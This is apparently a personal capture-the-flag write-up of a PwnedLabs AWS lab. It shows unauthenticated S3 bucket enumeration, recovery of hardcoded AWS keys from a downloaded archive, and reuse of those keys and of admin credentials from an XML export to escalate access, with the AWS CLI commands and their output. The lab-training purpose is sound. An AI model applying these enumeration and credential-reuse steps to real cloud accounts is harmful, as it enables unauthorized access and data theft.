---
title: AWS S3 Basics
layout: post
date: 2025-06-23
categories: [Writeups, PwnedLabs]
tags: [Cloud, AWS, S3]
author: bailee
toc: true
description: Examine a website found in a phished employee’s bookmarks, and gain access to privileged company data in a S3 bucket. 
---
Lab Platform:
: [PwnedLabs](https://pwnedlabs.io/labs/aws-s3-enumeration-basics)

---
## Tools & Commands

### Tools Used
- AWS CLI

### Commands
- `aws sts get-caller-identity`
  - The ‘whoami’ of AWS CLI, shows ARN of the user, including AWS Account ID.
- `aws s3 ls s3://<s3-name>`
  - List out the contents of a S3 bucket, and the directories within it.
- `aws s3 cp s3://<s3-name>`
  - Copy/download the specified file, use . at the end to ‘cat’ it to the screen

---

## Lab Walkthrough

### Enumeration & Initial Access 
Viewing the source of the website, we see a reference to `https://s3.amazonaws.com/dev.huge-logistics.com`

![image.png](assets/img/s3EnumerationBasics/image.png)

Looks like it at least has a static .png & CSS file in there.

We can try to navigate to just `https://s3.amazonaws.com/dev.huge-logistics.com/`, but we get an ‘access denied’ error.

![image.png](assets/img/s3EnumerationBasics/image1.png)

This is likely because we don’t have access to that bucket directory because of a policy.

Using the URL modifiers `prefix=` and `delimeter=/` in the URL request, it will output common prefixes that can be added to the end of the URL (like how we saw static/). Some interesting ones I’m seeing is admin/ and migration-files/.

![image.png](assets/img/s3EnumerationBasics/image2.png)

Using the CLI, we can attempt to list directories of the S3 bucket without signing in (the `--no-sign-request` modifier.) I want to go straight to the admin folder, since it looks fun.

```
# aws s3 ls s3://dev.huge-logistics.com/admin/
2023-10-16 09:08:38          0
2024-12-02 07:57:44         32 flag.txt
2023-10-16 14:24:07       2425 website_transactions_export.csv
```

Oo, give me that flag please.

```
# aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt -
download failed: s3://dev.huge-logistics.com/admin/flag.txt to - An error occurred (403) when calling the HeadObject operation: Forbidden
```

:( Guess we don’t have permission to access it. What else can we do?

After poking around, I found the shared/ directory has a file called h1_migration_project.zip. I downloaded it using ‘aws s3 cp’ and found hardcoded AWS keys, which looks like it’s used for the AWS Secrets Manager service.

```
#AWS Configuration
$accessKey = "AKIA*******WOWKXEHU"
$secretKey = "MwGe3leV*******************FiG83RX/gb9"
$region = "us-east-1"
```

### Privilege Escalation

I used ‘aws configure’ to add the access & secret keys, after using `aws sts get-caller-identity`, I see I now have the role called pam-test.

```
# aws sts get-caller-identity
{
    "UserId": "AIDA3SFMDAPOYPM3X2TB7",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/pam-test"
}
```

Pam-test has more access to the S3 directories, including /migration-files.

```
# aws s3 ls s3://dev.huge-logistics.com/migration-files/
2023-10-16 09:08:47          0
2023-10-16 09:09:26    1833646 AWS Secrets Manager Migration - Discovery & Design.pdf
2023-10-16 09:09:25    1407180 AWS Secrets Manager Migration - Implementation.pdf
2023-10-16 09:09:27       1853 migrate_secrets.ps1
2023-10-16 12:00:13       2494 test-export.xml
```
### Exfiltration

The most interesting file here is ‘migrate_secrets.ps1’. I used the command `# aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml -` to print the command to the command prompt screen. And there are more sets of credentials! One of them is for an ‘AWS IT Admin’.

```
  <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFM*****RFWFGCD</AccessKeyID>
        <SecretAccessKey>t21ERPmDq5C***********0bnL4hY6jP</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
```

Again, I used ‘aws configure’ to add the new access & secret key, and now we are an it-admin.

```
# aws sts get-caller-identity
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}
```

Immediately, I used the same command as before to get the flag, and it worked!